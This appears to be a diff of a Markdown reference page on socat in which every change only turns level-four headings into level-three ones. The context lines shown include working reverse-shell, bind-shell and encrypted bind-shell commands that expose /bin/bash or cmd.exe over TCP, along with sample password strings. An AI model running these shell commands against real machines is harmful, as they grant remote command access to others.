@@ -23,13 +23,13 @@ In fact, many of these features already exist in specialized tools; but until no
 
 ## Installation
 
-#### Debian
+### Debian
 
 ```plain
 sudo apt install socat
 ```
 
-#### macOS
+### macOS
 
 ```plain
 brew install socat
@@ -158,7 +158,7 @@ address-head:
 
 ## Examples
 
-#### Basic client/server
+### Basic client/server
 
 **Server:**
 
@@ -176,7 +176,7 @@ sudo socat TCP4:<remote-server>:80 STDOUT
 sudo socat - TCP4:<remote-server>:80
 ```
 
-#### Send a file to receiver
+### Send a file to receiver
 
 **Sender:**
 
@@ -201,7 +201,7 @@ Hellothere!
 Summer2022!
 ```
 
-#### Reverse shell
+### Reverse shell
 
 **Server:**
 
@@ -221,7 +221,7 @@ socat -d -d TCP4-LISTEN:443 STDOUT
 socat TCP4:10.0.0.10:443 EXEC:/bin/bash
 ```
 
-#### Bind shell
+### Bind shell
 
 **Server:**
 
@@ -237,7 +237,7 @@ socat -d -d TCP4-LISTEN:443 EXEC:'cmd.exe',pipes
 socat - TCP4:<IP-of-SERVER>:443
 ```
 
-#### Encrypted bind shell
+### Encrypted bind shell
 
 To create a certificate, please check [OpenSSL]({{< ref "openssl" >}}).
 
@@ -253,7 +253,7 @@ sudo socat OPENSSL-LISTEN:443,cert=yourcert.pem,verify=0,fork EXEC:/bin/bash
 socat - OPENSSL:10.11.0.4:443,verify=0
 ```
 
-#### Encrypted reverse shell
+### Encrypted reverse shell
 
 **Server:**
 
